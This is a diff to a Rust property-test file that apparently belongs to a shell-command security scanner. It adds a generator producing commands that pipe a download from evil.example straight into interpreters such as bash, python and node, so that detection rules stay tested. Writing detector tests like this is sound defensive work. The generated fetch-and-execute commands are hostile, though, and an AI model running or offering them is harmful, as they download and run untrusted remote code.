@@ -642,6 +642,29 @@ pub fn bash_process_subst_remote_pipe() -> impl Strategy<Value = String> {
         .prop_map(|(interp, fetcher)| format!("{interp} <({fetcher} http://evil.example/x)"))
 }
 
+/// Fetcher piped straight into an interpreter, covering the full
+/// fetcher × interpreter matrix the DSL remote-pipe rule declares in
+/// `src/rules/builtins.yaml`. Used to pin that every declared pair
+/// still fires, so narrowing either `commandAny` list breaks a test.
+pub fn bash_remote_pipe() -> impl Strategy<Value = String> {
+    let fetcher = prop_oneof![Just("curl"), Just("wget"), Just("fetch")];
+    let interp = prop_oneof![
+        Just("bash"),
+        Just("sh"),
+        Just("zsh"),
+        Just("fish"),
+        Just("ksh"),
+        Just("dash"),
+        Just("python"),
+        Just("python3"),
+        Just("ruby"),
+        Just("node"),
+        Just("perl"),
+    ];
+    (fetcher, interp)
+        .prop_map(|(fetcher, interp)| format!("{fetcher} http://evil.example/x.sh | {interp}"))
+}
+
 /// Combined short-option wrapper (`bash -lc 'X'`, `sh -ec 'X'`,
 /// `dash -ic 'X'`). Used to verify that the wrapper inspector still
 /// pulls `inner_argv` out of grouped short flags.
